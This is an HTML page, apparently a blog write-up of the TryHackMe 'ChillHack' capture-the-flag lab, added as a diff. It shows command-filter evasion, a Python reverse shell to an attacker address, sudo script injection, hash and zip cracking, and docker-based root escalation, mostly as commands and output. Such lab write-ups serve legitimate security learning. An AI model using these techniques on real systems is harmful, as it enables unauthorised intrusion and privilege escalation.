@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                TryHackMe: ChillHack
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Jan 8, 2021
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">ChillHack</a></li>
+        </ul>
+      </nav>
+<ul>
+<li>Also available on Vulnhub</li>
+</ul>
+<h3>Scanning</h3>
+<ul>
+<li>Get info about running services:</li>
+</ul>
+<pre><code><span>root@kali:~# sudo nmap -sV 10.10.186.203
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-08 10:15 EST
+Nmap scan report for 10.10.186.203
+Host is up (0.12s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 
+</span></code></pre>
+<h3>FTP</h3>
+<ul>
+<li>The ftp server allows anonymous login:</li>
+</ul>
+<pre><code><span>root@kali:~# ftp 10.10.186.203
+Connected to 10.10.186.203.
+220 (vsFTPd 3.0.3)
+Name (10.10.186.203:root): Anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span></code></pre>
+<ul>
+<li>Download the avialable file:</li>
+</ul>
+<pre><code><span>ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
+226 Directory send OK.
+ftp&gt; get note.txt
+local: note.txt remote: note.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note.txt (90 bytes).
+226 Transfer complete.
+90 bytes received in 0.00 secs (67.4008 kB/s)
+ftp&gt; 
+</span></code></pre>
+<p>Note.txt contents:</p>
+<blockquote>
+<p>Anurodh told me that there is some filtering on strings being put in the command -- Apaar</p>
+</blockquote>
+<h3>Web:</h3>
+<h5>Enumeration:</h5>
+<ul>
+<li>
+<p>Index Page:</p>
+<img src="images/25/1.png">
+</li>
+<li>
+<p>looking at the page source, none of the pages really do anything</p>
+</li>
+<li>
+<p>looking for files and folders on the server:</p>
+</li>
+</ul>
+<pre><code><span>root@kali:~# dirb http://10.10.186.203
+
+---- Scanning URL: http://10.10.186.203/ ----
+==&gt; DIRECTORY: http://10.10.186.203/css/                                       
+==&gt; DIRECTORY: http://10.10.186.203/fonts/                                     
+==&gt; DIRECTORY: http://10.10.186.203/images/                                    
++ http://10.10.186.203/index.html (CODE:200|SIZE:35184)                        
+==&gt; DIRECTORY: http://10.10.186.203/js/                                        
+==&gt; DIRECTORY: http://10.10.186.203/secret/     
+</span></code></pre>
+<ul>
+<li>There is probably something useful in the directory secret</li>
+</ul>
+<h4>Secret:</h4>
+<img src="images/25/2.png">
+<ul>
+<li>
+<p>This page lets you execute commands, there is some filtering though (as mentioned in notes.txt)</p>
+<img src="images/25/3.png">
+<p>If you run a blacklisted command:</p>
+<img src="images/25/4.png">
+</li>
+<li>
+<p>This command was used as an alternative to ls:</p>
+</li>
+</ul>
+<pre><code><span>echo * 
+</span></code></pre>
+<p>Result:</p>
+<img src="images/25/5.png">
+<ul>
+<li>If we can read the blacklisted commands then we will know which to avoid.</li>
+<li>This worked an alternative to cat:</li>
+</ul>
+<pre><code><span>sort index.php
+</span></code></pre>
+<p>Blacklist Contents:</p>
+<pre><code><span>$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
+</span></code></pre>
+<p>Additionally the code only checks for a whole match so something like nc1 would pass the blacklist.</p>
+<h5>Environment Variable Substitution for Command Filtering Evasion:</h5>
+<ul>
+<li>When we insert an environment variable that doesn't exist into a command it gets replaced by nothing creating a valid command that bypasses the blacklist.
+Since this method works:</li>
+</ul>
+<pre><code><span>root@kali:~# c`$p`at note.txt 
+</span></code></pre>
+<p>Start the listener:</p>
+<pre><code><span>nc -lvp 1234
+</span></code></pre>
+<p>We can do the same with a python reverse shell, adding nonexistant environment variables to all the commands on the blacklist (python3), and replacing /bin/sh with /bin/dash:</p>
+<pre><code><span>py`$p`thon3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.8.12.29&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/dash&quot;,&quot;-i&quot;]);'
+</span></code></pre>
+<h3>User:</h3>
+<p>When the reverse shell connects, we now have user www-data:</p>
+<pre><code><span>root@kali:~# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.186.203: inverse host lookup failed: Unknown host
+connect to [10.8.12.29] from (UNKNOWN) [10.10.186.203] 55556
+/bin/dash: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre>
+<p>Looking around we see there is 3 other users:</p>
+<pre><code><span>$ cd /home
+$ ls
+anurodh
+apaar
+aurick
+$ cd anurodh
+/bin/dash: 4: cd: can't cd to anurodh
+</span></code></pre>
+<p>The user flag is in the home directory of the user apaar, and while we cannot read it we find an interesting file helpline.sh:</p>
+<pre><code><span>$ cd apaar
+$ ls
+local.txt
+$ cat local.txt
+cat: local.txt: Permission denied
+$ ls -lia
+total 44
+655374 drwxr-xr-x 5 apaar apaar 4096 Oct  4 14:11 .
+655361 drwxr-xr-x 5 root  root  4096 Oct  3 04:28 ..
+655391 -rw------- 1 apaar apaar    0 Oct  4 14:14 .bash_history
+655375 -rw-r--r-- 1 apaar apaar  220 Oct  3 04:25 .bash_logout
+655376 -rw-r--r-- 1 apaar apaar 3771 Oct  3 04:25 .bashrc
+655389 drwx------ 2 apaar apaar 4096 Oct  3 05:20 .cache
+655387 drwx------ 3 apaar apaar 4096 Oct  3 05:20 .gnupg
+655380 -rwxrwxr-x 1 apaar apaar  286 Oct  4 14:11 .helpline.sh
+655377 -rw-r--r-- 1 apaar apaar  807 Oct  3 04:25 .profile
+655385 drwxr-xr-x 2 apaar apaar 4096 Oct  3 05:19 .ssh
+655381 -rw------- 1 apaar apaar  817 Oct  3 04:27 .viminfo
+655378 -rw-rw---- 1 apaar apaar   46 Oct  4 07:25 local.txt
+</span></code></pre>
+<p>The file helpline.sh contains a mock helpdesk script:</p>
+<pre><code><span>$ cat .helpline.sh
+#!/bin/bash
+
+echo
+echo &quot;Welcome to helpdesk. Feel free to talk to anyone at any time!&quot;
+echo
+
+read -p &quot;Enter the person whom you want to talk with: &quot; person
+
+read -p &quot;Hello user! I am $person,  Please enter your message: &quot; msg
+
+$msg 2&gt;/dev/null
+
+echo &quot;Thank you for your precious time!&quot;
+$ 
+
+</span></code></pre>
+<ul>
+<li>We can see that the msg variable could be executed as a command, with errors redirected to /dev/null</li>
+</ul>
+<p>Checking if the user can run anything with elevated privileges we see that www-data can run helpline.sh as apaar:</p>
+<pre><code><span>$ sudo -l
+Matching Defaults entries for www-data on ubuntu:
+...
+
+User www-data may run the following commands on ubuntu:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+</span></code></pre>
+<p>Upgrade to a proper shell:</p>
+<pre><code><span>$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</span></code></pre>
+<p>Run the helpline script as the user apaar, enter the message as <code>/bin/sh -i</code> to get an interactive shell:</p>
+<pre><code><span>www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
+sudo -u apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: john
+john
+Hello user! I am john,  Please enter your message: /bin/sh -i   
+/bin/sh -i
+id
+id
+uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
+</span></code></pre>
+<ul>
+<li>Now that we have a shell as the user apaar read the user flag:</li>
+</ul>
+<pre><code><span>cat local.txt
+
+{USER-FLAG: e8v_i_dont_want_to_get_in_trouble}
+</span></code></pre>
+<p>Upgrade to an interactive shell:</p>
+<pre><code><span>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+
+apaar@ubuntu:~$ 
+</span></code></pre>
+<p><strong>Enumerate as the user apaar</strong>:</p>
+<ul>
+<li>There may be a docker instance running:</li>
+</ul>
+<pre><code><span>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:1e:a7:08:b8 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+</span></code></pre>
+<ul>
+<li>I  completely missed the directory /var/www/files, which sucked because I usually check /var/www first</li>
+<li>In the folder there is several interesting files: hacker.php, account.php, and index.php:</li>
+<li>The cryptic messsage about looking in the dark suggests stego:</li>
+</ul>
+<pre><code><span>apaar@ubuntu:~$ cat /var/www/files/hacker.php
+cat /var/www/files/hacker.php
+...
+&lt;center&gt;
+	&lt;img src = &quot;images/hacker-with-laptop_23-2147985341.jpg&quot;&gt;&lt;br&gt;
+	&lt;h1 style=&quot;background-color:red;&quot;&gt;You have reached this far. &lt;/h2&gt;
+	&lt;h1 style=&quot;background-color:black;&quot;&gt;Look in the dark! You will find your answer&lt;/h1&gt;
+...
+apaar@ubuntu:~$ 
+</span></code></pre>
+<p>When we look in account.php we find there is table of usernames and passwords:</p>
+<pre><code><span>cat /var/www/files/account.php
+[SNIP]
+	public function login($un,$pw)
+	{
+		$pw = hash(&quot;md5&quot;,$pw);
+		$query = $this-&gt;con-&gt;prepare(&quot;SELECT * FROM users WHERE username='$un' AND password='$pw'&quot;);
+[SNIP]
+
+?&gt;
+
+</span></code></pre>
+<ul>
+<li>When we check index.php we find a root password, this is only the passwrd for the database and not for the user root:</li>
+</ul>
+<pre><code><span>apaar@ubuntu:/var/www/files$ cat index.php
+cat index.php
+[SNIP]
+try{
+			$con = new PDO(&quot;mysql:dbname=webportal;host=localhost&quot;,&quot;root&quot;,&quot;!@m+her00+@db&quot;);
+[SNIP]
+</span></code></pre>
+<ul>
+<li>We login to the database as root in hopes of finding more credentials:</li>
+</ul>
+<pre><code><span>apaar@ubuntu:/var/www/files$ mysql -u root -h localhost -D webportal -p
+mysql -u root -h localhost -D webportal -p
+Enter password: !@m+her00+@db
+
+mysql&gt; select * from users;
+select * from users;
++----+-----------+----------+-----------+----------------------------------+
+| id | firstname | lastname | username  | password                         |
++----+-----------+----------+-----------+----------------------------------+
+|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
+|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
++----+-----------+----------+-----------+----------------------------------+
+2 rows in set (0.00 sec)
+
+mysql&gt; 
+</span></code></pre>
+<p>Crack the password hashes:</p>
+<ul>
+<li>7e53614ced3640d5de23f111806cc4fd = masterpassword</li>
+<li>686216240e5af30df0501e53c789a649 = dontaskdonttell</li>
+</ul>
+<ul>
+<li>
+<p>It is a dead-end, as these passwords do not allow us to login anywhere</p>
+</li>
+<li>
+<p>Use netstat to check ports we find that there is a service running locally on port 9001:</p>
+</li>
+</ul>
+<pre><code><span>apaar@ubuntu:/var/www/files$ netstat -ntpl
+netstat -ntpl
+
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               
+[SNIP]
+</span></code></pre>
+<ul>
+<li>When we check it out we can see it is the same as index.php</li>
+</ul>
+<pre><code><span>apaar@ubuntu:/var/www/files$ curl http://localhost:9001
+curl http://localhost:9001
+[SNIP]
+			&lt;div class=&quot;header&quot;&gt;
+				&lt;h2 style=&quot;color:blue;&quot;&gt;Customer Portal&lt;/h2&gt;
+				&lt;h3 style=&quot;color:green;&quot;&gt;Log In&lt;h3&gt;
+			&lt;/div&gt;
+			&lt;form method=&quot;POST&quot;&gt;
+[SNIP]
+</span></code></pre>
+<ul>
+<li>Since we want to get the images from hacker.php for potential stego, we need to be able to access the site remotely.</li>
+<li>If we add our public key to the file .ssh/authorized_keys we can log in to apaar via SSH and use SSH tunneling to acess the web service:</li>
+</ul>
+<pre><code><span>apaar@ubuntu:~/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYatZE9zGjo4hhKEU6+ZVFVPjBnoMH3fAqVp26YSDnRZ4fo/jTvfWstE5/[SNIPPED]&quot; &gt; authorized_keys
+</span></code></pre>
+<p>Using the -L parameter to tunnel our traffic, we can now access the web service at localhost:9999:</p>
+<pre><code><span>root@kali:~# ssh -L 9999:localhost:9001 apaar@10.10.186.203
+</span></code></pre>
+<p>Visit it in our browser:</p>
+<img src="images/25/7.png">
+<ul>
+<li>Download both of the images, and look for hidden text/files</li>
+<li>Using stegoveritas on the file hacker-laptop we can see that something has been hidden with steghide:</li>
+</ul>
+<pre><code><span>Found something with StegHide: /root/Downloads/results/steghide_f70de1ee463e0085a214352a0f14d476.bin
+Running Module: MultiHandler
+</span></code></pre>
+<p>Use steghide to extract the embedded file backup.zip:</p>
+<pre><code><span>root@kali:~/Downloads# steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
+Enter passphrase: 
+wrote extracted data to &quot;backup.zip&quot;.
+root@kali:~/Downloads# 
+</span></code></pre>
+<ul>
+<li>The file backup.zip is password protected, use zip2john to extract the password hash:</li>
+</ul>
+<pre><code><span>root@kali:~/Downloads# zip2john backup.zip &gt; chill_zip
+ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
+</span></code></pre>
+<ul>
+<li>Crack the password:</li>
+</ul>
+<pre><code><span>root@kali:~/Downloads# john --wordlist=/root/rockyou.txt -rules chill_zip 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+pass1word        (backup.zip/source_code.php)
+1g 0:00:00:01 DONE (2021-01-08 12:39) 0.9708g/s 15906p/s 15906c/s 15906C/s total90..cocoliso
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</span></code></pre>
+<ul>
+<li>In backups.zip we find the file source_code which contains the password for the user anurodh encoded in base64, decode it and use this password to login as the user:</li>
+<img src="images/25/8.png">
+<li>Using cyberchef to decode from base64:</li>
+<img src="images/25/9.png">
+</ul>
+<pre><code><span>apaar@ubuntu:~$ ls /home
+anurodh  apaar  aurick
+apaar@ubuntu:~$ su anurodh
+Password: 
+anurodh@ubuntu:/home/apaar$ 
+</span></code></pre>
+<ul>
+<li>The user anurodh is in the docker group, meaning they have privileges to run docker, we can use docker to spawn an interactive root shell:</li>
+</ul>
+<pre><code><span>anurodh@ubuntu:~$ id -a
+uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+</span></code></pre>
+<p>From GTFO bins entry for docker:</p>
+<pre><code><span>docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</span></code></pre>
+<p>Getting root:</p>
+<pre><code><span>anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+</span></code></pre>
+<p>Root Flag:</p>
+<pre><code><span># cd /root
+# ls
+proof.txt
+# cat proof.txt
+
+{ROOT-FLAG: w18g_i_dont_want_to_get_in_trouble}
+
+Congratulations! You have successfully completed the challenge.
+
+</span></code></pre>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
